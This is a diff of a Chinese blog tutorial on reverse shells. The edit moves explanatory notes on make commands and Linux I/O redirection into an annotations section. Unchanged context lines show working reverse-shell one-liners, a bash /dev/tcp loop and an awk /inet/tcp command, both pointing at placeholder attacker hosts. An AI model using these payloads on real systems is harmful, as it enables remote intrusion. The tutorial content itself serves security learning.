@@ -16,11 +16,9 @@ cover: https://pic.imgdb.cn/item/647c13aaf024cca173275063.png
 
 ## 反弹 shell 的概念
 
-{% blockquote Marcus_Holloway  https://xz.aliyun.com/t/9488#toc-8 %}
-反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。
-{% endblockquote %}
+>反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。
 
-{% label Marcus_Holloway %} 师傅在先知的文章是目前我见过写反弹 shell 最易懂的一篇，本文也是基于此篇文章，跟着师傅脚步做一个复现。
+`Marcus_Holloway` 师傅在先知的文章是目前我见过写反弹 shell 最易懂的一篇，本文也是基于此篇文章，跟着师傅脚步做一个复现。
 
 ## nc 反弹 shell
 
@@ -50,21 +48,8 @@ export NETCAT_HOME=/usr/local/netcat-0.7.1
 export PATH=$PATH:$NETCAT_HOME/bin
 ```
 
-{% hideToggle 注释 %}
+关于 `CMake` 相关的解释请看下面的注解<sup>[【1】](#CMake-知识点)</sup>
 
-用形象但不完全准确地话来描述 Linux 安装软件时的相关命令。
-
-- `./configure` : 就是设计部出了一张设计稿，根据客户需要，符合各种要求。
-- `make` : 就是前端组做好了模板。
-- `make install` : 就是实施人员将模板上传至了后台，而且做了各种模板绑定，能真正看到实际展示效果。
-- `make clean` : 清除编译产生的可执行文件及目标文件（ `object file` ，`*.o` ），也就是说 make 之后再来一条 make clean 就等于没有make过，这点在 make 出错时变得极为有用。
-- `make distclean` : 这个就厉害了，它除了清除可执行文件和目标文件外，把 configure 所产生的 Makefile 也清除掉。运行过甚至相当于没有 configure 过。
-- `make veryclean` : veryclean 是有多 clean？其实和 distclean 一样 clean。
-- `make uninstall` : 虽然不是每个 sourcecode 包都有这个功能，但是这个东西确实是挺好的。想想看当你一时脑热直接 `./configure` 、`make` 、`make install` 之后，都不知道程序装去哪儿了，这时候就可以用这个进行卸载（当然 `uninstall` 只能执行1次，并且 sourcecode 目录中要有当前安装对应的 Makefile）。
-
-关于 Linux 环境变量的设置，可以参考这篇 [文章](https://blog.csdn.net/Solomon1558/article/details/51763751) 。
-
-{% endhideToggle %}
 
 安装完后输入 `nc -h` 检验，有 `-e` 参数说明安装成功了。
 
@@ -120,39 +105,7 @@ exec 5<>/dev/tcp/[LHostIP]/[Port];cat <&5 | while read line; do $line 2>&5 >&5; 
 | `cat <&5` | 该命令会将文件描述符 5 的输入重定向到 `cat` 命令的标准输入上，使得通过该 TCP 连接传输的数据可以被 `cat` 命令读取。`<` 符号表示输入重定向。`&` 符号表示将文件描述符作为参数而不是文件名进行处理。 |
 | `while read line; do $line 2>&5 >&5; done` | 该命令会不断读取 `cat` 命令的标准输入，将每一行数据存入变量 `line` 中，然后执行 `$line` 命令，将该命令的标准输出和标准错误输出都重定向到文件描述符 5 上，使得执行结果可以通过该 TCP 连接传输。`2>&5` 表示将标准错误输出重定向到文件描述符 5 上，`>&5` 表示将标准输出也重定向到文件描述符 5 上。`while` 循环会持续执行，直到 `cat` 命令的标准输入被关闭或者连接断开。|
 
-{% hideToggle Linux 输入输出那些事,orange, %}
-
-关于 shell 中的重定向、 `&>file` 、 `2>&1` 、`1>&2` 、`/dev/null` 的一些知识点：
-
-1. Linux 中把所有设备全部视作文件，而在默认情况下，有三个文件始终处于打开状态：
-
-| 类型 | 方式 | 文件描述符 |
-| --- | --- | :---: |
-| 标准输入 | 键盘输入 | 0 |
-| 标准输出 | 输出到屏幕 | 1 |
-|标准错误 |  输出到屏幕 | 2 |
-
-2. 关于重定向：
-
-| 命令              | 说明                                       |
-| -----------------| -------------------------------------------|
-| `command > file`   | 将输出重定向到 file                        |
-| `command < file`   | 将输入重定向到 file                        |
-| `command >> file`  | 将输出以追加的方式重定向到 file             |
-| `n > file`         | 将文件描述符为 n 的文件重定向到 file       |
-| `n >> file`        | 将文件描述符为 n 的文件以追加的方式重定向到 file |
-| `n >& m`           | 将输出文件 m 和 n 合并                      |
-| `n <& m`           | 将输入文件 m 和 n 合并                      |
-| `<< tag`           | 将开始标记 tag 和结束标记 tag 之间的内容作为输入 |
-
-3. 关于 `/dev/null/` ：
-
-`/dev/null` 是一个特殊的设备文件，在类Unix操作系统中经常被用来丢弃不需要的输出或输入流。它是一个黑洞或空设备，任何写入它的数据都将被丢弃，而读取它则会立即返回 EOF（文件结束符）。
-
-在 Linux 系统中，`/dev/null` 通常被用来丢弃不需要的输出。例如，当我们使用一个命令并希望将其输出丢弃而不是打印在屏幕上时，我们可以使用重定向将其输出重定向到 `/dev/null` 。例如，`command > /dev/null` 将会将 `command` 的标准输出（ `stdout` ）重定向到 `/dev/null` 中，从而丢弃输出。
-
-类似地，当我们想要防止某些命令从标准输入（ `stdin` ）中读取数据时，我们可以将 `stdin` 重定向到 `/dev/null` ，例如 `command < /dev/null` 。这将使得 `command` 不会从 `stdin` 中读取任何输入数据。通常这种做法可以用来避免某些命令在等待输入时被阻塞，或者在不需要输入的情况下强制关闭标准输入。
-{% endhideToggle %}
+关于 Linux 输入输出那些事，请看下文注解<sup>[【2】](#Linux-输入输出那些事)</sup>
 
 反弹成功效果如下：
 
@@ -285,3 +238,53 @@ awk 'BEGIN{s="/inet/tcp/0/[LHostIp]/[Port]";while(1){do{s|&getline c;if(c){while
 ```
 
 ![awk 反弹结果](https://pic.imgdb.cn/item/647c13a5f024cca17327450b.png)
+
+
+## 注解
+
+### CMake 知识点
+
+用形象但不完全准确地话来描述 Linux 安装软件时的相关命令。
+
+- `./configure` : 就是设计部出了一张设计稿，根据客户需要，符合各种要求。
+- `make` : 就是前端组做好了模板。
+- `make install` : 就是实施人员将模板上传至了后台，而且做了各种模板绑定，能真正看到实际展示效果。
+- `make clean` : 清除编译产生的可执行文件及目标文件（ `object file` ，`*.o` ），也就是说 make 之后再来一条 make clean 就等于没有make过，这点在 make 出错时变得极为有用。
+- `make distclean` : 这个就厉害了，它除了清除可执行文件和目标文件外，把 configure 所产生的 Makefile 也清除掉。运行过甚至相当于没有 configure 过。
+- `make veryclean` : veryclean 是有多 clean？其实和 distclean 一样 clean。
+- `make uninstall` : 虽然不是每个 sourcecode 包都有这个功能，但是这个东西确实是挺好的。想想看当你一时脑热直接 `./configure` 、`make` 、`make install` 之后，都不知道程序装去哪儿了，这时候就可以用这个进行卸载（当然 `uninstall` 只能执行1次，并且 sourcecode 目录中要有当前安装对应的 Makefile）。
+
+关于 Linux 环境变量的设置，可以参考这篇 [文章](https://blog.csdn.net/Solomon1558/article/details/51763751) 。
+
+### Linux 输入输出那些事
+
+关于 shell 中的重定向、 `&>file` 、 `2>&1` 、`1>&2` 、`/dev/null` 的一些知识点：
+
+1. Linux 中把所有设备全部视作文件，而在默认情况下，有三个文件始终处于打开状态：
+
+| 类型 | 方式 | 文件描述符 |
+| --- | --- | :---: |
+| 标准输入 | 键盘输入 | 0 |
+| 标准输出 | 输出到屏幕 | 1 |
+|标准错误 |  输出到屏幕 | 2 |
+
+2. 关于重定向：
+
+| 命令              | 说明                                       |
+| -----------------| -------------------------------------------|
+| `command > file`   | 将输出重定向到 file                        |
+| `command < file`   | 将输入重定向到 file                        |
+| `command >> file`  | 将输出以追加的方式重定向到 file             |
+| `n > file`         | 将文件描述符为 n 的文件重定向到 file       |
+| `n >> file`        | 将文件描述符为 n 的文件以追加的方式重定向到 file |
+| `n >& m`           | 将输出文件 m 和 n 合并                      |
+| `n <& m`           | 将输入文件 m 和 n 合并                      |
+| `<< tag`           | 将开始标记 tag 和结束标记 tag 之间的内容作为输入 |
+
+3. 关于 `/dev/null/` ：
+
+`/dev/null` 是一个特殊的设备文件，在类Unix操作系统中经常被用来丢弃不需要的输出或输入流。它是一个黑洞或空设备，任何写入它的数据都将被丢弃，而读取它则会立即返回 EOF（文件结束符）。
+
+在 Linux 系统中，`/dev/null` 通常被用来丢弃不需要的输出。例如，当我们使用一个命令并希望将其输出丢弃而不是打印在屏幕上时，我们可以使用重定向将其输出重定向到 `/dev/null` 。例如，`command > /dev/null` 将会将 `command` 的标准输出（ `stdout` ）重定向到 `/dev/null` 中，从而丢弃输出。
+
+类似地，当我们想要防止某些命令从标准输入（ `stdin` ）中读取数据时，我们可以将 `stdin` 重定向到 `/dev/null` ，例如 `command < /dev/null` 。这将使得 `command` 不会从 `stdin` 中读取任何输入数据。通常这种做法可以用来避免某些命令在等待输入时被阻塞，或者在不需要输入的情况下强制关闭标准输入。
